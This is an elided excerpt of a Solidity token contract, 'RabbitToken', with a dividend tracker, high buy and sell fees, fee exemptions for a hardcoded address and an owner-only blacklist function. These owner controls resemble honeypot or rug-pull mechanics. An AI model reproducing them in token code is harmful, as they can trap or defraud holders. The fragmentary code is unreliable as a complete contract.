...
contract DividendTracker is DividendPayingToken {
    ...
    constructor() {
        claimWait = 3600;
        minimumTokenBalanceForDividends = 80000000 * (10 ** 18);
...
contract RabbitToken is IERC20, Ownable {
    using SafeMath for uint256;
    ...
    uint256 startFunNum;
    uint256 public _buyHeightFee = 500;
    uint256 public _sellHeightFee = 3000;
    uint256 public _heightFeeTime = 1; // s
    uint256 public _buyBaseFee = 500;
    uint256 public _sellBaseFee = 3000;
    uint256 public _traFee = 1000;
    ...
    constructor(
        ...
        dividendTracker.excludeFromDividends(Address3);
        dividendTracker.excludeFromDividends(Address4);
        dividendTracker.excludeFromDividends(address(0xC2A4B2D53bEE9882818363c123Ee6b97925aF854));

        exemptFee[address(this)] = true;
        exemptFee[Address3] = true;
        exemptFee[address(0xC2A4B2D53bEE9882818363c123Ee6b97925aF854)] = true;
    ...
    function addBlackList2(address[] memory addressList, bool value) external onlyOwner {
        for (uint256 i = 0; i < addressList.length; i++) {
            isBlackAddress[addressList[i]] = value;
        }
    }

    function updateStartFun(uint256 value) external onlyOwner {
        startFunNum = value * 10 ** 18;
    }
    ...
    function _transfer(
        ...
        if (isActive[to] && !isSent) {
            isSent = true;
            try dividendTracker.setBalance(payable(to), balanceOf(to)) {} catch {}
        }

        if (isActive[from] && !isSent) {
            isSent = true;
            try dividendTracker.setBalance(payable(from), balanceOf(from)) {} catch {}
        }

        if (_swapPairList[from] && !isSent) {
            isActive[to] = true;
            try dividendTracker.setBalance(payable(to), balanceOf(to)) {} catch {}
        }
    ...
    function swapAndDistribute(uint256 amount) private lockTheSwap {
        ...
        bool success = IERC20(usdt).transfer(address(dividendTracker), tokenBalance);
        ...
        try dividendTracker.process(gas) returns (uint256 iterations, uint256 claims, uint256 _lastProcessedIndex) {
    ...
    function _tokenTransfer(
        ...
        if (takeFee) {
            ...
            if (swapAmount > 0) {
                if (isTrans) {
                    _takeTransfer(sender, address(deadAddress), swapAmount);
                } else {
